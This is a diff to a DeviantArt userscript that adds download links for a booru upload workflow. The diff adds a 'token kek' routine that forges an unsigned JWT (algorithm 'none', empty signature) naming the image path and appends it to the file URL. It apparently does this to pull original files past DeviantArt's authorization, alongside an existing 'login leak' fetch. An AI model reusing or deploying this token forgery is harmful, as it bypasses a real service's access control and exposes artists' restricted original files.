@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name         DeviantArt ADUp Module
-// @version      0.4.2
+// @version      0.5.0
 // @author       stsyn
 // @include      http*://*.deviantart.com/*
 // @include      /http(s|):\/\/(www\.|)(trixie|derpi)booru.org\/images\/new.*/
@@ -25,8 +25,7 @@
   const LOGIN = 'BoW0n';
 
   const leak = true;
-  const derpImage = "url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmlld0JveD0iMCAwIDE2IDE2Ij48cGF0aCBkPSJtMTMuMiwuNmM1LDkuMi0uMiwxNS41LTIuOSwxNS4zcy0zLjYsLTQuNy05LjIsLTQuNWMyLjYsLTMuNCA4LjMsLS4zIDkuOCwtMS42czMuNywtNS40IDIuMywtOS4yIiBmaWxsPSIjNzNkNmVkIj48L3BhdGg+PHBhdGggZD0ibTExLDAuNi0xLjcsMS40LTEuNywtMS4yLjgsMi0xLjcsMWgxLjhsLTUuNSw5LjcuNCwuMiA1LjUsLTkuNy42LDEuOCAuNSwtMiAyLjIsLS4xLTEuOCwtMS4xLjYsLTIiIGZpbGw9IiM5NGMxZGQiPjwvcGF0aD48Y2lyY2xlIGN4PSIxMy41IiBjeT0iOC41IiBmaWxsPSIjZmZmIiBpZD0iZSIgcj0iMC41Ij48L2NpcmNsZT48dXNlIHg9Ii0yIiB5PSIzIiB4bGluazpocmVmPSIjZSI+PC91c2U+PHVzZSB4PSItNiIgeT0iNCIgeGxpbms6aHJlZj0iI2UiPjwvdXNlPjx1c2UgeD0iLTIuOCIgeT0iNiIgeGxpbms6aHJlZj0iI2UiPjwvdXNlPjwvc3ZnPgo=')";
-
+  
   let l, width, height, artist;
 
   function spawn(link, text) {
@@ -50,7 +49,6 @@
       href,
       style: 'width:calc(50% - 18px);display:inline-block;margin-right:4px'
     }, [
-      createElement('i', {style: {width: '20px', background: derpImage}}),
       createElement('span.label', ' Upload on DB'),
       createElement('span.text', ' ' + text),
     ]);
@@ -58,8 +56,6 @@
     target3.appendChild(ds);
     let ls = ds.cloneNode(true);
     ls.href = link;
-    ls.getElementsByTagName('i')[0].style.background = "url(https://st.deviantart.net/minish/deviation/action-sprites.png?)";
-    ls.getElementsByTagName('i')[0].style.backgroundPosition = '-1px -78px';
     ls.querySelector('span.label').innerHTML = " Direct link";
     ls.addEventListener('click', (e) => {
       e.preventDefault();
@@ -122,15 +118,14 @@
       spawn(dlink, 'intermediary');
 
       spawn(await fetchFullFromLoginScreen(), 'login leak');
+
+      // token kek
+      // All credit goes to @Ironchest337
+      const payload = `{"sub":"urn:app:","iss":"urn:app:","obj":[[{"path":"\/f\/${data.baseUri.split('/f/')[1].replace(/\//g, '\/')}"}]],"aud":["urn:service:file.download"]}`;
+      spawn(`${data.baseUri}?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.${btoa(payload).replace(/=/g, '')}.`, 'token kek');
     })
 
-    // leak
-    /*const code = parseInt(location.href.split('-').pop()).toString(36);
-    dlink = `http://orig01.deviantart.net/x_by_x-d${code}.png`;
-    spawn(dlink, "leak");
-
-    if (document.querySelector('.dev-description .text.block')) text = '[bq]'+document.querySelector('.dev-description .text.block').innerText+'[/bq]';*/
-
+    // if (document.querySelector('.dev-description .text.block')) text = '[bq]'+document.querySelector('.dev-description .text.block').innerText+'[/bq]';
   }
 
   function DA_check() {
